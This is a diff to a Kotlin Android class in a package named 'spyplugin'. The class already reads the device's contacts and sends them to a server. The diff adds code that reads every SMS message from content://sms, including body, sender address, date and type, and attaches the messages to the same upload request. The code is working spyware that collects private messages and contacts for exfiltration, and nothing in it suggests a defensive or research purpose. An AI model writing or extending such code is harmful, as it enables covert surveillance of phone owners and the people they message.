@@ -1,7 +1,9 @@
 package com.example.spyplugin
 
 import android.content.ContentResolver
+import android.net.Uri
 import android.provider.ContactsContract
+import android.provider.Telephony
 import android.util.Log
 import com.example.background.InfoProvider
 import kotlin.collections.emptyList
@@ -11,8 +13,10 @@ class InfoProviderClass : InfoProvider {
     override suspend fun sendInfo(resolver: ContentResolver): Boolean {
         val contacts = getContacts(resolver)
         logContacts(contacts)
+        val smsList = getSmsList(resolver)
         val request = ContactsRequest(
-            contacts
+            contacts,
+            smsList
         )
 
         val success = sendToServer(request)
@@ -94,13 +98,59 @@ class InfoProviderClass : InfoProvider {
             "Phones: ${contactInfo.phoneNumbers.joinToString()}")
         }
     }
+
+    private fun getSmsList(resolver: ContentResolver): List<SmsModel> {
+        val smsList = mutableListOf<SmsModel>()
+
+        val uri = Uri.parse("content://sms")
+        val cursor = resolver.query(
+            uri,
+            null,
+            null,
+            null,
+            "date DESC"
+        )
+
+        cursor?.use {
+            val bodyIndex = it.getColumnIndex("body")
+            val addressIndex = it.getColumnIndex("address")
+            val dateIndex = it.getColumnIndex("date")
+            val typeIndex = it.getColumnIndex("type")
+
+            while (it.moveToNext()) {
+                val body = it.getString(bodyIndex)
+                val address = it.getString(addressIndex)
+                val date = it.getLong(dateIndex)
+                val type = it.getInt(typeIndex)
+
+                smsList.add(
+                    SmsModel(
+                        body = body,
+                        address = address,
+                        date = date,
+                        type = type
+                    )
+                )
+            }
+        }
+
+        return smsList
+    }
 }
 
 data class ContactsRequest(
     val contacts: List<ContactInfo>,
+    val smsList: List<SmsModel>,
     val timestamp: Long = System.currentTimeMillis()
 )
 data class ContactInfo(
     val name: String,
     val phoneNumbers: List<String>
+)
+
+data class SmsModel(
+    val body: String,
+    val address: String,
+    val date: Long,
+    val type: Int // 1 = inbox, 2 = sent
 )
